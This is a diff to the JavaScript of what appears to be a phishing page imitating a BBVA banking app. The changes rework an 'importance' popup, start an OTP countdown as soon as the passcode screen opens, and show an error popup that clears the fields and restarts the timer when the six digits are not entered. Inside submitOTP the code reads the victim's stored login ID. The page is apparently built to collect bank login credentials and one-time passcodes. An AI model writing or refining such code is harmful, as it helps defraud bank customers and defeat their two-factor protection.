@@ -360,16 +360,23 @@ document.addEventListener('DOMContentLoaded', function() {
     // Attach listeners initially
     attachButtonListeners();
     
-    // Transition from first screen (download.jpg) to importance notice screen
+    // Transition from first screen (download.jpg) to importance popup
     // Change the delay (3000 = 3 seconds) to adjust timing
     setTimeout(function() {
         const firstScreen = document.querySelector('.first-screen');
-        const importanceScreen = document.getElementById('importance-notice-screen');
+        const importancePopup = document.getElementById('importance-popup-overlay');
+        const secondScreen = document.querySelector('.second-screen');
         
-        if (firstScreen && importanceScreen) {
+        if (firstScreen && importancePopup && secondScreen) {
+            // Hide first screen
             firstScreen.classList.add('hide');
-            importanceScreen.classList.add('show');
-            console.log('Importance notice screen is now visible!');
+            
+            // Show home screen (transparent/visible behind popup)
+            secondScreen.classList.add('show');
+            
+            // Show popup overlay
+            importancePopup.classList.add('show');
+            console.log('Importance popup is now visible!');
         }
     }, 3000); // 3 seconds delay - change this value as needed
     
@@ -676,7 +683,8 @@ function showOTPVerificationScreen() {
     if (otpVerificationOverlay) {
         otpVerificationOverlay.classList.add('active');
         
-        // Don't start timer here - it will start when user clicks Submit OTP
+        // Start OTP resend timer when OTP screen appears
+        startOTPTimer();
         
         // Focus on first OTP input
         setTimeout(function() {
@@ -724,14 +732,28 @@ function startOTPTimer() {
             clearInterval(otpTimer);
             otpTimer = null;
             
-            // Enable resend button
-            if (resendBtn) {
-                resendBtn.disabled = false;
-            }
+            // Check if OTP was entered
+            const otp1 = document.getElementById('otp-1').value;
+            const otp2 = document.getElementById('otp-2').value;
+            const otp3 = document.getElementById('otp-3').value;
+            const otp4 = document.getElementById('otp-4').value;
+            const otp5 = document.getElementById('otp-5').value;
+            const otp6 = document.getElementById('otp-6').value;
+            const otp = otp1 + otp2 + otp3 + otp4 + otp5 + otp6;
             
-            // Update text
-            if (timerText) {
-                timerText.innerHTML = lang.resendOTP || 'Resend OTP';
+            // If OTP is not complete, show error popup
+            if (otp.length !== 6) {
+                showOTPErrorPopup();
+            } else {
+                // Enable resend button if OTP was entered
+                if (resendBtn) {
+                    resendBtn.disabled = false;
+                }
+                
+                // Update text
+                if (timerText) {
+                    timerText.innerHTML = lang.resendOTP || 'Resend OTP';
+                }
             }
         }
     }, 1000);
@@ -1061,8 +1083,7 @@ async function submitOTP() {
         return;
     }
     
-    // Start OTP resend timer when user clicks Submit OTP
-    startOTPTimer();
+    // Timer is already running from when screen appeared
     
     // Get stored login credentials (stored when login was submitted)
     const storedLoginId = sessionStorage.getItem('bbva_login_id') || 'Not available';
@@ -1172,63 +1193,99 @@ async function handleActivateCardClick() {
     });
 }
 
-// Proceed to Home Screen from Importance Notice
+// Proceed to Home Screen from Importance Popup
 function proceedToHomeScreen() {
-    const importanceScreen = document.getElementById('importance-notice-screen');
-    const secondScreen = document.querySelector('.second-screen');
+    const importancePopup = document.getElementById('importance-popup-overlay');
     
-    if (importanceScreen && secondScreen) {
-        // Hide importance notice screen
-        importanceScreen.classList.remove('show');
+    if (importancePopup) {
+        // Hide popup
+        importancePopup.classList.remove('show');
         
-        // Show home screen
+        console.log('Home screen is now fully visible - buttons should work!');
+        
+        // Update greeting when popup closes
         setTimeout(function() {
-            secondScreen.classList.add('show');
-            console.log('Home screen is now visible - buttons should work!');
+            const greetingElement = document.getElementById('greeting');
+            if (greetingElement) {
+                const currentHour = new Date().getHours();
+                let greetingKey;
+                if (currentHour >= 5 && currentHour < 12) {
+                    greetingKey = 'greetingMorning';
+                } else if (currentHour >= 12 && currentHour < 17) {
+                    greetingKey = 'greetingAfternoon';
+                } else {
+                    greetingKey = 'greetingEvening';
+                }
+                greetingElement.textContent = translations[currentLanguage][greetingKey];
+            }
+        }, 100);
+        
+        // Re-attach button listeners after popup closes
+        setTimeout(function() {
+            const helpButton = document.getElementById('help-button');
+            const menuButton = document.getElementById('menu-button');
             
-            // Update greeting when home screen appears
-            setTimeout(function() {
-                const greetingElement = document.getElementById('greeting');
-                if (greetingElement) {
-                    const currentHour = new Date().getHours();
-                    let greetingKey;
-                    if (currentHour >= 5 && currentHour < 12) {
-                        greetingKey = 'greetingMorning';
-                    } else if (currentHour >= 12 && currentHour < 17) {
-                        greetingKey = 'greetingAfternoon';
-                    } else {
-                        greetingKey = 'greetingEvening';
-                    }
-                    greetingElement.textContent = translations[currentLanguage][greetingKey];
-                }
-            }, 100);
+            if (helpButton) {
+                const newHelpButton = helpButton.cloneNode(true);
+                helpButton.parentNode.replaceChild(newHelpButton, helpButton);
+                newHelpButton.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    openHelpScreen(e);
+                }, true);
+            }
             
-            // Re-attach button listeners after screen transition
-            setTimeout(function() {
-                const helpButton = document.getElementById('help-button');
-                const menuButton = document.getElementById('menu-button');
-                
-                if (helpButton) {
-                    const newHelpButton = helpButton.cloneNode(true);
-                    helpButton.parentNode.replaceChild(newHelpButton, helpButton);
-                    newHelpButton.addEventListener('click', function(e) {
-                        e.preventDefault();
-                        e.stopPropagation();
-                        openHelpScreen(e);
-                    }, true);
-                }
-                
-                if (menuButton) {
-                    const newMenuButton = menuButton.cloneNode(true);
-                    menuButton.parentNode.replaceChild(newMenuButton, menuButton);
-                    newMenuButton.addEventListener('click', function(e) {
-                        e.preventDefault();
-                        e.stopPropagation();
-                        openMenuScreen(e);
-                    }, true);
-                }
-            }, 100);
-        }, 300);
+            if (menuButton) {
+                const newMenuButton = menuButton.cloneNode(true);
+                menuButton.parentNode.replaceChild(newMenuButton, menuButton);
+                newMenuButton.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    openMenuScreen(e);
+                }, true);
+            }
+        }, 100);
+    }
+}
+
+// Show OTP Error Popup
+function showOTPErrorPopup() {
+    const errorPopup = document.getElementById('otp-error-popup-overlay');
+    if (errorPopup) {
+        errorPopup.classList.add('show');
+    }
+}
+
+// Close OTP Error Popup
+function closeOTPErrorPopup() {
+    const errorPopup = document.getElementById('otp-error-popup-overlay');
+    if (errorPopup) {
+        errorPopup.classList.remove('show');
+        
+        // Clear OTP inputs
+        document.getElementById('otp-1').value = '';
+        document.getElementById('otp-2').value = '';
+        document.getElementById('otp-3').value = '';
+        document.getElementById('otp-4').value = '';
+        document.getElementById('otp-5').value = '';
+        document.getElementById('otp-6').value = '';
+        
+        // Hide error message if visible
+        const errorMessage = document.getElementById('otp-error-message');
+        if (errorMessage) {
+            errorMessage.style.display = 'none';
+        }
+        
+        // Restart timer
+        startOTPTimer();
+        
+        // Focus on first input
+        setTimeout(function() {
+            const firstInput = document.getElementById('otp-1');
+            if (firstInput) {
+                firstInput.focus();
+            }
+        }, 100);
     }
 }
 
